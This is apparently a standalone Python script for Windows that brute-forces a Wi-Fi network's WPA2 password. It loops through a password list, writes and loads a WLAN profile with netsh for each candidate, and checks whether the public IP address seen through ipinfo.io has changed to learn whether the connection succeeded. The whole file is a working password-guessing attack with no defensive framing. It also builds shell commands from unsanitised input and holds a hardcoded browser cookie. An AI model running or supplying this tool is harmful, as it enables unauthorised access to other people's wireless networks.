#! /bin/python3

import os
import requests
import time


def confirm_connection():
    headers = {
        'authority': 'ipinfo.io',
        'cache-control': 'max-age=0',
        'sec-ch-ua': '" Not;A Brand";v="99", "Google Chrome";v="97", "Chromium";v="97"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'upgrade-insecure-requests': '1',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.99 Safari/537.36',
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
        'sec-fetch-site': 'none',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-user': '?1',
        'sec-fetch-dest': 'document',
        'accept-language': 'en-US,en;q=0.9',
        'cookie': '_lfa=LF1.1.8f49dea19dc24899.1643126331431; _ga=GA1.2.499665624.1643126331; ajs_user_id=null; ajs_group_id=null; ajs_anonymous_id=%2210d71a57-629e-4445-a5a3-34249e4376d0%22; _ga_RWP85XL4SC=GS1.1.1643647940.3.0.1643647940.60',
    }

    response = requests.get('https://ipinfo.io/json', headers=headers)
    return response.json()['ip']

def Establish_connection(name, ssid, password):

    configure = """<?xml version=\"1.0\"?>
<WLANProfile xmlns="http://www.microsoft.com/networking/WLAN/profile/v1">
    <name>""" + name + """</name>
    <SSIDConfig>
        <SSID>
            <name>""" + ssid + """</name>
        </SSID>
    </SSIDConfig>
    <connectionType>ESS</connectionType>
    <connectionMode>auto</connectionMode>
    <MSM>
        <security>
            <authEncryption>
                <authentication>WPA2PSK</authentication>
                <encryption>AES</encryption>
                <useOneX>false</useOneX>
            </authEncryption>
            <sharedKey>
                <keyType>passPhrase</keyType>
                <protected>false</protected>
                <keyMaterial>""" + password + """</keyMaterial>
            </sharedKey>
        </security>
    </MSM>
</WLANProfile>"""
    command = "netsh wlan add profile filename=\"" + name + ".xml\"" + " interface=Wi-Fi"
    with open(name + ".xml", 'w') as file:
        file.write(configure)
    os.system(command)

def connect(name, ssid):
    command = "netsh wlan connect name=\"" + name + "\" ssid=\"" + ssid + "\" interface=Wi-Fi"
    os.system(command)

def Available_networks():
    command = "netsh wlan show networks interface=Wi-Fi"
    os.system(command)

Available_networks()

name = input("Name of Wi-Fi: ")
current_ip = input('enter your current ip address')

passwds = []
with open("passlist.txt", 'r') as g:
    for l in g.readlines():
        passwds.append(l.strip())

print(passwds)

for i in passwds:
    Establish_connection(name, name, i)

    connect(name, name)
    time.sleep(5)
    print(confirm_connection())
    if confirm_connection() == current_ip:
        print(f"{name} password IS NOT: {i}")
        print("Invalid password")
    else:
        print(f"{name} password is: {i}")
        break
